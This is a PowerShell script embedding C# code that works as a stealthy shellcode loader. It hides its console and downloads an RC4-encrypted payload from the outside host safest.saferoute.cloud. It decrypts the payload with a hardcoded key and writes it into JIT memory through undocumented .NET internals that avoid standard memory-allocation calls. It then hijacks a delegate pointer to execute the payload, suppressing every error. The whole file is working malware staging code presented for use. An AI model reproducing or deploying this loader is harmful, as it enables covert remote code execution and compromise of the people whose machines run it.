Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

public class PowerShellRunner
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0;
    private const int SW_SHOW = 5;

    public static void HideConsole()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
    }

    public static void ShowConsole()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_SHOW);
    }

    public static void WriteMm(IntPtr addr, IntPtr value)
    {
        var mngdRefCustomeMarshaller = typeof(System.String).Assembly.GetType("System.StubHelpers.MngdRefCustomMarshaler");
        var CreateMarshaler = mngdRefCustomeMarshaller.GetMethod("CreateMarshaler", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
        CreateMarshaler.Invoke(null, new object[] { addr, value });
    }

    public static IntPtr ReadMm(IntPtr addr)
    {
        var stubHelper = typeof(System.String).Assembly.GetType("System.StubHelpers.StubHelpers");
        var GetNDirectTarget = stubHelper.GetMethod("GetNDirectTarget", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
        IntPtr unmanagedPtr = Marshal.AllocHGlobal(200);

        for (int i = 0; i < 200; i += IntPtr.Size)
        {
            Marshal.Copy(new[] { addr }, 0, unmanagedPtr + i, 1);
        }

        IntPtr result = (IntPtr)GetNDirectTarget.Invoke(null, new object[] { unmanagedPtr });
        Marshal.FreeHGlobal(unmanagedPtr);
        return result;
    }

    public static void CpMm(byte[] source, IntPtr dest)
    {
        if ((source.Length % IntPtr.Size) != 0)
        {
            source = source.Concat<byte>(new byte[source.Length % IntPtr.Size]).ToArray();
        }

        GCHandle pinnedArray = GCHandle.Alloc(source, GCHandleType.Pinned);
        IntPtr sourcePtr = pinnedArray.AddrOfPinnedObject();

        for (int i = 0; i < source.Length; i += IntPtr.Size)
        {
            WriteMm(dest + i, ReadMm(sourcePtr + i));
        }

        Array.Clear(source, 0, source.Length);
        pinnedArray.Free();
    }

    public delegate void Callback();
    public static void Action()
    {
        // Empty action
    }

    delegate void Callingdelegate();

    public static IntPtr GenThreMm(int ByteCount)
    {
        AssemblyName AssemblyName = new AssemblyName("Assembly");
        AssemblyBuilder AssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(AssemblyName, AssemblyBuilderAccess.Run);
        ModuleBuilder ModuleBuilder = AssemblyBuilder.DefineDynamicModule("Module", true);
        MethodBuilder MethodBuilder = ModuleBuilder.DefineGlobalMethod(
            "MethodName", MethodAttributes.Public | MethodAttributes.Static, typeof(void), new Type[] { }
        );

        ILGenerator il = MethodBuilder.GetILGenerator();
        int originalByteCount = ByteCount;
        
        while (ByteCount > 0)
        {
            int length = 4;
            StringBuilder str_build = new StringBuilder();
            Random random = new Random();

            for (int i = 0; i < length; i++)
            {
                double flt = random.NextDouble();
                int shift = Convert.ToInt32(Math.Floor(25 * flt));
                char letter = Convert.ToChar(shift + 65);
                str_build.Append(letter);
            }

            il.EmitWriteLine(str_build.ToString());
            ByteCount -= 18;
        }
        
        il.Emit(OpCodes.Ret);
        ModuleBuilder.CreateGlobalFunctions();
        RuntimeMethodHandle mh = ModuleBuilder.GetMethods()[0].MethodHandle;
        RuntimeHelpers.PrepareMethod(mh);
        return mh.GetFunctionPointer();
    }

    public static void RcReverse(byte[] data, byte[] key)
    {
        byte[] S = new byte[256];
        int i, j;

        for (i = 0; i < 256; i++)
        {
            S[i] = (byte)i;
        }

        // KSA
        for (i = 0, j = 0; i < 256; i++)
        {
            j = (j + S[i] + key[i % key.Length]) & 0xFF;
            byte temp = S[i];
            S[i] = S[j];
            S[j] = temp;
        }

        // PRGA
        i = 0; j = 0;
        for (int n = 0; n < data.Length; n++)
        {
            i = (i + 1) & 0xFF;
            j = (j + S[i]) & 0xFF;
            byte temp = S[i];
            S[i] = S[j];
            S[j] = temp;
            data[n] ^= S[(S[i] + S[j]) & 0xFF];
        }
    }

    public static byte[] DownPad(string url)
    {
        using (WebClient client = new WebClient())
        {
            client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            client.Headers.Add("cache-control", "max-age=00");
            return client.DownloadData(url);
        }
    }

    static void Exec(Object stateinfo)
    {
        try
        {
            HideConsole();
            
            string urltofile = "https://safest.saferoute.cloud/";
            byte[] filebuffenc = DownPad(urltofile);

            if (filebuffenc == null || filebuffenc.Length == 0)
            {
                return;
            }

            byte[] key = new byte[] { 0x99, 0x35, 0x13, 0x7D, 0x75, 0x3E, 0xC5, 0x3C, 0xC2, 0x65, 0xD5, 0x40, 0x97, 0xD4, 0xB0, 0x13 };
            
            RcReverse(filebuffenc, key);
            byte[] filebuffer = filebuffenc;

            var jmpCode = new byte[] { 0x48, 0xB8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0xFF, 0xE0 };

            Callback myAction = new Callback(Action);
            IntPtr pMyAction = Marshal.GetFunctionPointerForDelegate(myAction);
            IntPtr pMem = GenThreMm(filebuffer.Length);

            CpMm(filebuffer, pMem);
            CpMm(jmpCode, pMyAction);
            WriteMm(pMyAction + 2, pMem);

            Callingdelegate callingdelegate = Marshal.GetDelegateForFunctionPointer<Callingdelegate>(pMyAction);
            callingdelegate();
        }
        catch
        {
        }
    }

    public static void Main()
    {
        try
        {
            Exec(null);
        }
        catch
        {
        }
    }
}
"@ -Language CSharp

[PowerShellRunner]::Main()